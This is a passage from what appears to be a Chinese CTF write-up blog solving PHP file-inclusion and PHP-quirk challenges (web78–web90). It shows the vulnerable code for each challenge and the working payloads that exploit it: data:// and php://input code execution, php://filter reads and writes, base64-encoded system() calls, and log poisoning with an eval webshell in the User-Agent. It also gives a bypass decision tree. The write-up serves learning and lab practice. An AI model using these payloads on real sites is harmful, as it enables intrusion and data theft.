class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接让 file&#x3D;flag.php 是没用的，因为他是一个 php 文件，包含到当前页面会被当成 php 源吗解析，那么他的 flag 是定义的属性，又不会给你打印出来，相当于执行了&lt;?php $flag&#x3D;xxxx，这里又不会给你打印，所以你需要用 filter 协议，以 base64 的格式去读取，或者用 data 协议去命令执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<blockquote>
<p>关键部分为 include 这里的$file 可由 get 传参控制，由于没有过滤所以这里方法较多。</p>
<p>使用 data 协议可以很直观有条理的获得 flag</p>
<p><code>?file=data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;</code> 可以获取当前目录文件发现有一个 flag.php</p>
<p><code>?file=data://text/plain,&lt;?php system(&#39;tac flag.php&#39;);?&gt;</code> 即可读取 flag.php 的中的内容。</p>
</blockquote>
<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>

<p>尝试使用短标签无果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;? system(&#x27;whoami&#x27;);?&gt;</span><br></pre></td></tr></table></figure>





<p>结果 wp 跟我说这样就行了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?= system(&#x27;whoami&#x27;);?&gt;</span><br></pre></td></tr></table></figure>



<p><code>&lt;?=</code> 以代替 <code>&lt;? echo </code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?= system(&#x27;tac flag.***&#x27;);?&gt;</span><br></pre></td></tr></table></figure>





<blockquote>
<p>法一：input 协议 大小写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload: </span><br><span class="line"></span><br><span class="line">POST /?file=Php://input HTTP/1.1</span><br><span class="line"></span><br><span class="line">&lt;?Php system(&quot;ls&quot;);?&gt;</span><br><span class="line"></span><br><span class="line">POST /?file=Php://input HTTP/1.1</span><br><span class="line"></span><br><span class="line">&lt;?Php system(&quot;cat flag.php&quot;);?&gt;</span><br><span class="line"></span><br><span class="line"># 仅需在请求行 大写即可</span><br></pre></td></tr></table></figure>

<p><strong>法二: data 协议 + 利用 php 性质绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line"></span><br><span class="line">?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw== # &lt;?php phpinfo();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?file=data://text/plain,&lt;?= `tac f*`;?&gt;</span><br><span class="line">?file=data://text/plain,&lt;?Php echo `tac f*`;?&gt;  # 可以无 ；</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>&lt;?php ?&gt;</code> :php 默认的开始、结束标签 <code>&lt;? ?&gt;</code> :需要开启 short_open_tag ，即 short_open_tag &#x3D; On。 <code>&lt;%%&gt;</code> :需要开启 asp_tags ，即 asp_tags &#x3D; On。 <code>&lt;?= ?&gt;</code> :用于输出，等同于- 可以直接使用 <code>&lt;%= %&gt;</code> :用于输出，等同于- ，需要开启 asp_tags ，才可以使用 short_open_tag 控制的是<code>&lt;? ?&gt;</code>标签。而并非<code>&lt;?= ?&gt;</code>标签，<code>&lt;?= ?&gt;</code>标签用于输出变量。当开启 short_open_tag，<code>&lt;? ?&gt;</code> 功能和<code>&lt;?php ?&gt;</code> 一样。 <a target="_blank" rel="noopener" href="https://blog.csdn.net/hsd2012/article/details/51194554?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-2-51194554-blog-100028185.pc_relevant_vip_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-2-51194554-blog-100028185.pc_relevant_vip_default&utm_relevant_index=3">php中代码开始标志类型(,,,&lt;% %&gt;,&lt;%&#x3D; %&gt;)</a></p>
</blockquote>
<p><strong>法三：data 协议 base64 加密</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==   # &lt;?php system(&#x27;ls&#x27;);</span><br><span class="line"></span><br><span class="line">/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= # &lt;?php system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure></blockquote>
<blockquote>
<p>&#x2F;&#x2F; 包含日志文件</p>
<p>&#x2F;&#x2F; bp 拦截请求 修改 UA 为 <?php @eval($_GET[1]);?></p>
<p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&amp;1&#x3D;system(“tac fl0g.php”);</p>
</blockquote>
<h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /?file=Php://input HTTP/1.1</span><br><span class="line">&lt;?Php system(&quot;tac f*&quot;);?&gt;</span><br></pre></td></tr></table></figure>

<p>(需要先 ls)</p>
<h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接把伪协议禁了，抄一下上面日志注入的方法。</p>
<p>&#x2F;&#x2F; 在响应头中可以看到服务器为 nginx</p>
<p>&#x2F;&#x2F; 包含 nginx 访问日志记录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=/var/log/nginx/access.log&amp;1=system(&quot;tac%20fl0g.php&quot;); </span><br></pre></td></tr></table></figure>



<p>image-20250702183321642](..&#x2F;..&#x2F;AppData&#x2F;Roaming&#x2F;Typora&#x2F;typora-user-images&#x2F;image-20250702183321642.png</p>
<h3 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);</span><br></pre></td></tr></table></figure>

<p>这句话的意思是，将 die＋$content，放入 url 解码后的$file 中。</p>
<p>思路：</p>
<p>$content 是任意可控的，但是前面是 die，所以要让 die die。</p>
<p>怎么让 die die 呢？因为 die 和$content 是一起读取的，所以我们让$file 用 base64 解码的方式写入，也就是说，先对 die 和$content 进行 base64 解码，再写入。那么我们把我们想要写入的命令先 base64 编码，就会无损。而 base64 解码只会注意 phpdie 这六个字符，所以 die 就没办法发挥作用了。</p>
<p>但是这里还有一个问题，因为 base64 是四个为单位，所以读取的时候会拉上后面两个字符。所以我们需要传入的 content 是“两个字符长度的垃圾数据”+“base64 编码的关键命令”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaPD9waHAgc3lzdGVtKCdscycpOw==</span><br></pre></td></tr></table></figure>



<p>还有一个要绕过的过滤，是$file，但是很简单，他是先替换再解码，我们在替换的时候把指定字符藏起来不就好了？</p>
<p>当我们编码一次，浏览器不会帮我编码，于是服务器解码一次就发现了要过滤的字符。</p>
<p>当我们编码两次，那么服务器自己解码一次，获得的是我们编码一次的 URL 编码，没有要替换的字符，在最后的 url 解码部分才成为纯净的你原来想写入的代码。</p>
<blockquote>
<p>注意看，传过去的 file 参数经过了 urldecode() 函数解码。所以 file 参数的内容要经过 url 编码再传递。同时网络传递时会对 url 编码的内容解一次码，所以需要对内容进行两次 url 编码。</p>
<p>另外，需要绕过 die() 函数。</p>
<p>根据文章 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php:&#x2F;&#x2F;filter的妙用</a> ，可以有以下思路：</p>
<ul>
<li>base64 编码范围是 0 ~ 9，a ~ z，A ~ Z，+，&#x2F; ，所以除了这些字符，其他字符都会被忽略。</li>
<li>所以对于 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> ，base64 编解码过滤之后就只有 <code>phpdie</code> 6 个字符了，即可进行绕过。</li>
<li>前面的 file 参数用 <strong>php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-encode</strong> 来解码写入，这样文件的 die() 就会被 base64 过滤，这样 die() 函数就绕过了。</li>
<li>后面再拼接 base64 编码后的一句话木马或者 php 代码，被解码后刚好可以执行。</li>
<li>由于 base64 是 4 个一组，而 <strong>phpdie</strong> 只有六个，所以要加两个字母凑足 base64 的格式。</li>
</ul>
<p>这题传参时，file 用 get 方法，content 用 post 方法。</p>
</blockquote>
<h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>虽然我很想用条件竞争，但是条件竞争的题目在前面来着…</p>
<p>被过滤的字符有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php ~ ! @ # $ % ^ &amp; * ( ) - _ + = .</span><br></pre></td></tr></table></figure>

<p>拦住 <code>.</code> → 那就别用路径穿越</p>
<p>拦住 <code>php</code> → 不用 php:&#x2F;&#x2F;</p>
<p>没拦 <code>data:</code> → 尝试 data:&#x2F;&#x2F;</p>
<p>拦住 <code>=</code> → 尝试删掉结尾 &#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTs/Pg</span><br></pre></td></tr></table></figure>

<p>📌 一、常见绕过技巧的【字符依赖表】</p>
<table>
<thead>
<tr>
<th>技术 &#x2F; Payload 用法</th>
<th>依赖字符（被过滤就不能用）</th>
<th>可用情况说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>php://input</code></td>
<td><code>php</code>、<code>:</code>、<code>/</code></td>
<td>伪协议输入</td>
</tr>
<tr>
<td><code>data://text/plain;base64,...</code></td>
<td><code>data</code>、<code>:</code>、<code>/</code>、（建议有 <code>=</code>）</td>
<td>base64 执行</td>
</tr>
<tr>
<td><code>file://path/to/file</code></td>
<td><code>:</code>、<code>/</code>、<code>.</code></td>
<td>本地文件包含</td>
</tr>
<tr>
<td><code>../../etc/passwd</code></td>
<td><code>.</code>、<code>/</code></td>
<td>路径穿越</td>
</tr>
<tr>
<td><code>phpinfo()</code></td>
<td><code>(</code>、<code>)</code>、<code>phpinfo</code></td>
<td>打探信息</td>
</tr>
<tr>
<td><code>eval($_GET[x])</code></td>
<td><code>$</code>、<code>(</code>、<code>)</code></td>
<td>任意执行</td>
</tr>
<tr>
<td><code>system(&quot;ls&quot;)</code></td>
<td><code>(</code>、<code>)</code>、<code>&quot;</code>、<code>system</code></td>
<td>命令执行</td>
</tr>
<tr>
<td>Base64 payload</td>
<td><code>=</code>（可以省略）</td>
<td><code>=</code> 是可选填充</td>
</tr>
<tr>
<td>Log 包含 (<code>/var/log/apache2/...</code>)</td>
<td><code>/</code>、<code>.</code></td>
<td>利用日志注入</td>
</tr>
<tr>
<td>Session 包含 (<code>/var/lib/php/sess_</code>)</td>
<td><code>/</code>、<code>.</code></td>
<td>利用 session 注入</td>
</tr>
<tr>
<td>包含远程文件 (<code>http://...</code>)</td>
<td><code>:</code>、<code>/</code>、<code>.</code>、<code>http</code></td>
<td>URL 包含（前提是 allow_url_include &#x3D; On）</td>
</tr>
</tbody></table>
<p>🌲 二、文件包含漏洞的【利用策略树】</p>
<p>这棵树你可以记成一个“先判断，再选择策略”的流程：</p>
<p>txt复制编辑看见 include、require → 判断是否用户可控</p>
<p>├── 是 → 看是否有过滤（preg_match）？<br>│<br>├── 没有过滤任何字符<br>│   └── ✅ 使用 php:&#x2F;&#x2F;input 直接包含 POST 的恶意代码<br>│<br>├── 过滤了 php:&#x2F;&#x2F; 或 php<br>│   └── ✅ 尝试 data:&#x2F;&#x2F; 协议（编码后的 payload）<br>│<br>├── 过滤了 <code>.</code> 或 <code>/</code><br>│   └── ❌ 无法使用路径穿越、log&#x2F;session包含<br>│<br>├── 过滤了 <code>=</code><br>│   └── ⚠️ base64 编码 payload 去掉 <code>=</code> 测试是否仍可解码<br>│<br>├── 没过滤 <code>:</code> 和 <code>data</code><br>│   └── ✅ 试试 <code>data://text/plain;base64,PD9...</code><br>│<br>├── 能访问日志、session 文件<br>│   └── ✅ 尝试日志注入、session 注入包含<br>│<br>└── 什么都不能用？<br>    └── 😢 尝试构造可用字符绕过、混淆符号、目录软链接等</p>
<p>🔁 三、实战用法：快速判断法</p>
<p>拿到一道文件包含题，可以快速这么判断：</p>
<p>text复制编辑1. 看是否 include($xx) 或 require($xx) ✅<br>2. 看是否 GET 控参？（如 ?file&#x3D;xxx） ✅<br>3. 看是否有过滤？（preg_match 或 replace） ✅<br>4. 把不能用的字符列出来 ❌<br>5. 和字符依赖表对照 ✅<br>6. 选最合适策略下 payload 🧠</p>
<h2 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h2><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1 。 故此传入?num[]&#x3D;1,产生错误返回1。 并且preg_math()传入数组参数也会直接返回0</p>
</blockquote>
<p>⚠️ 小拓展：关于 SQL 注入中的数组绕过</p>
<p>你提到的这段也很经典：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.php?id=1  →  正常执行  </span><br><span class="line">.php?id[]=1 → 页面没变，可能是 id 被 intval 处理了</span><br></pre></td></tr></table></figure>

<p>在 PHP 中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&#x27;id&#x27;] =&gt; array(1)  // 当参数是 id[]=1 时</span><br><span class="line"></span><br><span class="line">intval($_GET[&#x27;id&#x27;])     // 返回 1（带 Notice）</span><br></pre></td></tr></table></figure>

<p>所以，如果后台开发者粗心地写了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id = intval($_GET[&#x27;id&#x27;]);</span><br></pre></td></tr></table></figure>

<p>那么：</p>
<ul>
<li>本来想防注入（比如你加了引号 ‘1），也不会有影响，因为 <code>intval(&#39;1&#39;) == 1</code>，<code>intval(&#39;1\&#39; or 1=1&#39;) == 1</code></li>
<li>更糟的是，<strong>你传数组也能绕过去！</strong></li>
</ul>
<h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看题目，要求get一个num，值不等于4476并且intval之后等于4476</p>
<p>👉 <code>intval($num, 0)</code> 是什么意思？</p>
<ul>
<li>这个用法会让 PHP <strong>自动根据前缀判断进制</strong>：</li>
</ul>
<table>
<thead>
<tr>
<th>前缀</th>
<th>例子</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>无</td>
<td><code>123</code></td>
<td>十进制</td>
</tr>
<tr>
<td><code>0x</code></td>
<td><code>0x117c</code></td>
<td>十六进制</td>
</tr>
<tr>
<td><code>0</code></td>
<td><code>07744</code></td>
<td>八进制（PHP8 不推荐）</td>
</tr>
<tr>
<td><code>0b</code></td>
<td><code>0b110</code></td>
<td>二进制</td>
</tr>
</tbody></table>
<p>所以：</p>
<ul>
<li><code>intval(&quot;0x117c&quot;, 0)</code> &#x3D; 十六进制 <code>0x117c</code> &#x3D; <strong>十进制 4476</strong></li>
<li><code>intval(&quot;4476a&quot;, 0)</code> &#x3D; PHP 解析前面合法的部分，得到 <code>4476</code></li>
<li><code>intval(&quot;4476.1&quot;, 0)</code> &#x3D; 转换成 <code>4476</code></li>
</ul>
<p>注意：</p>
<p>这些例子都是 <strong>字符串不等于 “4476”</strong>，但经过 <code>intval()</code> 后结果是 <code>4476</code>，所以能通过判断，输出 <code>$flag</code>。</p>
